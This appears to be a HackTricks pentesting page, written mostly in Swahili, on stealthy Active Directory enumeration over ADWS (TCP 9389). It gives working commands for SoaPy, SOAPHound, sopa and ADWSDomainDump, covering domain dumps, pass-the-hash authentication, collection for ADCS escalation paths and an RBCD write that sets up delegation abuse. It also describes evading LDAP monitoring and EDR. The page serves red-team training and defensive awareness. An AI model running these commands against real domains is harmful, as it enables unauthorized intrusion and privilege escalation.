# Active Directory Web Services (ADWS) Uorodheshaji & Ukusanyaji wa Kijasiri

{{#include ../../banners/hacktricks-training.md}}

## ADWS ni nini?

Active Directory Web Services (ADWS) imewezeshwa kwa chaguo-msingi kwenye kila Domain Controller tangu Windows Server 2008 R2 na inasikiza kwenye TCP **9389**. Licha ya jina, **hakuna HTTP inahusika**. Badala yake, huduma inatoa data kwa mtindo wa LDAP kupitia stack ya itifaki za kufungia za .NET za umiliki:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Kwa sababu trafiki imefungwa ndani ya fremu hizi za binary SOAP na inasafiri kupitia port isiyo ya kawaida, **uorodheshaji kupitia ADWS unatimizwa kwa uwezekano mdogo wa kuchunguzwa, kuchujwa au kufanyiwa signature ikilinganishwa na trafiki ya kawaida ya LDAP/389 & 636**. Kwa watendaji hii inamaanisha:

* Stealthier recon – Blue teams mara nyingi hushughulikia maswali ya LDAP.
* Uhuru wa kukusanya kutoka kwa vifaa visivyo vya Windows (Linux, macOS) kwa kuingiza 9389/TCP kupitia SOCKS proxy.
* Data ile ile unayopata kupitia LDAP (users, groups, ACLs, schema, n.k.) na uwezo wa kufanya **writes** (mfano `msDs-AllowedToActOnBehalfOfOtherIdentity` kwa **RBCD**).

Mwingiliano ya ADWS unatekelezwa juu ya WS-Enumeration: kila swali huanza na ujumbe wa `Enumerate` unaoelezea filter/attributes za LDAP na kurudisha GUID ya `EnumerationContext`, ikifuatiwa na ujumbe mmoja au zaidi wa `Pull` ambao hupitisha hadi dirisha la matokeo lililotangazwa na server. Contexts hufa baada ya takriban dakika ~30, kwa hivyo zana zinahitaji kuruka matokeo au kugawanya filters (maulizo ya prefix kwa kila CN) ili kuepuka kupoteza state. Unapouliza kwa security descriptors, bainisha control ya `LDAP_SERVER_SD_FLAGS_OID` ili kuondoa SACLs; vinginevyo ADWS huacha tu attribute ya `nTSecurityDescriptor` kutoka kwenye jibu lake la SOAP.

> NOTE: ADWS pia inatumiwa na zana nyingi za RSAT GUI/PowerShell, hivyo trafiki inaweza kuchanganyika na shughuli halali za admin.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) ni **utekelezaji kamili wa stack ya itifaki ya ADWS kwa Python safi**. Inaunda fremu za NBFX/NBFSE/NNS/NMF byte kwa byte, ikiruhusu ukusanyaji kutoka kwa mifumo inayofanana na Unix bila kugusa runtime ya .NET.

### Sifa Muhimu

* Inasaidia **proxying kupitia SOCKS** (inutumika kutoka C2 implants).
* Filters za utafutaji zenye udhibiti mdogo sawia na LDAP `-q '(objectClass=user)'`.
* Operesheni za hiari za **write** ( `--set` / `--delete` ).
* **BOFHound output mode** kwa uingiliano wa moja kwa moja kwenye BloodHound.
* Bendera `--parse` ili kufanya timestamps / `userAccountControl` ziwe za kusomeka kwa binadamu.

### Bendera za ukusanyaji uliolengwa & operesheni za kuandika

SoaPy inakuja na swichi zilizopangwa zinazorudia kazi za kawaida za utafutaji za LDAP juu ya ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, pamoja na `--query` / `--filter` kwa pulls maalum. Weka hizo pamoja na primitives za write kama `--rbcd <source>` (sets `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging kwa Kerberoasting iliyolengwa) na `--asrep` (flip `DONT_REQ_PREAUTH` katika `userAccountControl`).

Mfano wa utafutaji wa SPN uliolengwa ambao unarudisha tu `samAccountName` na `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Tumia mwenyeji/credentials sawa ili mara moja weaponise findings: dump RBCD-capable objects kwa kutumia `--rbcds`, kisha tumia `--rbcd 'WEBSRV01$' --account 'FILE01$'` ili stage Resource-Based Constrained Delegation chain (ona [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) kwa njia kamili ya abuse path).

### Ufungaji (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump kupitia ADWS (Linux/Windows)

* Fork ya `ldapdomaindump` inayobadilisha LDAP queries kwa ADWS calls kwenye TCP/9389 ili kupunguza LDAP-signature hits.
* Hufanya ukaguzi wa awali wa upatikanaji kwa 9389 isipokuwa `--force` ipitwe (inaruka probe ikiwa port scans ni noisy/filtered).
* Imetestwa dhidi ya Microsoft Defender for Endpoint na CrowdStrike Falcon na bypass iliyofanikiwa imeelezewa katika README.

### Usanidi
```bash
pipx install .
```
### Matumizi
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
Matokeo ya kawaida hurekodi 9389 reachability check, ADWS bind, na dump start/finish:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Mteja wa vitendo wa ADWS kwa Golang

Kwa namna ile ile kama soapy, [sopa](https://github.com/Macmod/sopa) inatekeleza ADWS protocol stack (MS-NNS + MC-NMF + SOAP) katika Golang, ikitoa bendera za command-line kutekeleza viito vya ADWS kama:

* **Utafutaji na urejeshaji wa object** - `query` / `get`
* **Mzunguko wa maisha ya object** - `create [user|computer|group|ou|container|custom]` na `delete`
* **Uhariri wa sifa** - `attr [add|replace|delete]`
* **Usimamizi wa akaunti** - `set-password` / `change-password`
* na vingine kama `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, etc.

### Mambo muhimu ya ramani ya itifaki

* Utafutaji wa mtindo wa LDAP unatekelezwa kupitia **WS-Enumeration** (`Enumerate` + `Pull`) na projection ya sifa, udhibiti wa wigo (Base/OneLevel/Subtree) na pagination.
* Kuchukua object moja hutumia **WS-Transfer** `Get`; mabadiliko ya sifa hutumia `Put`; ufutaji hutumia `Delete`.
* Undaji wa object uliowekwa ndani hutumia **WS-Transfer ResourceFactory**; object maalum hutumia **IMDA AddRequest** inayoendeshwa na templates za YAML.
* Operesheni za nywila ni vitendo vya **MS-ADCAP** (`SetPassword`, `ChangePassword`).

### Ugundaji wa metadata bila uthibitisho (mex)

ADWS inaonyesha WS-MetadataExchange bila uthibitisho, ambayo ni njia ya haraka ya kuthibitisha kuoneshwa kabla ya kuthibitisha:
```bash
sopa mex --dc <DC>
```
### Ugunduzi wa DNS/DC & vidokezo vya kulenga Kerberos

Sopa inaweza kutatua DCs kupitia SRV ikiwa `--dc` imetoweka na `--domain` imetolewa. Inauliza kwa mpangilio huu na inatumia lengo lenye kipaumbele cha juu:
```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```
Kiutendaji, pendelea resolver inayodhibitiwa na DC ili kuepuka kushindwa katika mazingira yaliyogawanywa:

* Tumia `--dns <DC-IP>` ili **yote** SRV/PTR/forward lookups zipitie kupitia DNS ya DC.
* Tumia `--dns-tcp` wakati UDP imezuiwa au majibu ya SRV ni makubwa.
* Ikiwa Kerberos imewezeshwa na `--dc` ni IP, sopa inafanya **reverse PTR** kupata FQDN kwa lengo sahihi la SPN/KDC. Ikiwa Kerberos haitumiwi, hakuna PTR lookup itakayofanyika.

Mfano (IP + Kerberos, DNS iliyolazimishwa kupitia DC):
```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```
### Chaguzi za nyenzo za uthibitisho

Mbali na nywila za maandishi wazi, sopa inasaidia **NT hashes**, **Kerberos AES keys**, **ccache**, na **PKINIT certificates** (PFX or PEM) kwa uthibitisho wa ADWS. Kerberos inaashiriwa wakati wa kutumia `--aes-key`, `-c` (ccache) au chaguzi zinazotegemea cheti.
```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```
### Uundaji wa vitu maalum kwa kutumia templates

Kwa darasa lolote la kitu, amri ya `create custom` inatumia template ya YAML inayolingana na IMDA `AddRequest`:

* `parentDN` na `rdn` zinafafanua container na DN ya jamaa.
* `attributes[].name` inaunga mkono `cn` au `addata:cn` yenye namespace.
* `attributes[].type` inakubali `string|int|bool|base64|hex` au `xsd:*` wazi.
* Do **not** include `ad:relativeDistinguishedName` or `ad:container-hierarchy-parent`; sopa inawaingiza.
* Thamani za `hex` zinabadilishwa kuwa `xsd:base64Binary`; tumia `value: ""` kuweka string tupu.

## SOAPHound – Mkusanyaji wa ADWS kwa Kiasi Kikubwa (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) ni mkusanyaji wa .NET ambao unaweka maingiliano yote ya LDAP ndani ya ADWS na hutengeneza JSON inayolingana na BloodHound v4. Inajenga cache kamili ya `objectSid`, `objectGUID`, `distinguishedName` na `objectClass` mara moja (`--buildcache`), kisha inaitumia tena kwa `--bhdump`, `--certdump` (ADCS), au `--dnsdump` (AD-integrated DNS) kwa mzigo mkubwa ili takriban tu ~35 sifa muhimu ziondoke DC. AutoSplit (`--autosplit --threshold <N>`) huwagawa maswali kwa prefix ya CN kwa kutumia atomati ili kubaki chini ya muda wa kusitisha wa EnumerationContext wa dakika 30 katika forests kubwa.

Mtiririko wa kawaida kwenye VM ya operator iliyowekwa kwenye domain:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
JSON zilizotolewa ziliingizwa moja kwa moja katika workflows za SharpHound/BloodHound—see [BloodHound methodology](bloodhound.md) for downstream graphing ideas. AutoSplit hufanya SOAPHound kustahimili kwenye forests zenye vitu vya mamilioni huku ikidumisha idadi ya queries kuwa chini kuliko snapshots za mtindo wa ADExplorer.

## Stealth AD Collection Workflow

Ifuatayo workflow inaonyesha jinsi ya kuorodhesha **domain & ADCS objects** kupitia ADWS, kuzi تبدیل kuwa BloodHound JSON na kuwinda njia za mashambulizi zinazotegemea vyeti – yote kutoka Linux:

1. **Tunnel 9389/TCP** kutoka kwenye mtandao wa lengo hadi kwenye mashine yako (kwa mfano via Chisel, Meterpreter, SSH dynamic port-forward, etc.).  Weka `export HTTPS_PROXY=socks5://127.0.0.1:1080` au tumia SoaPy’s `--proxyHost/--proxyPort`.

2. **Collect the root domain object:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Kusanya vitu vinavyohusiana na ADCS kutoka Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Geuza kuwa BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Pakia ZIP** katika BloodHound GUI na endesha cypher queries kama `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` ili kufichua njia za kupandishwa ngazi kwa vyeti (ESC1, ESC8, etc.).

### Kuandika `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Unganisha hili na `s4u2proxy`/`Rubeus /getticket` kwa mnyororo kamili wa **Resource-Based Constrained Delegation** (tazama [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Muhtasari wa Zana

| Kusudi | Zana | Maelezo |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Hubadilisha SoaPy/ldapsearch logs |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Inaweza kupitishwa kupitia SOCKS ile ile |
| ADWS enumeration & object changes | [sopa](https://github.com/Macmod/sopa) | Generic client to interface with known ADWS endpoints - allows for enumeration, object creation, attribute modifications, and password changes |

## Marejeo

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Sopa GitHub](https://github.com/Macmod/sopa)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
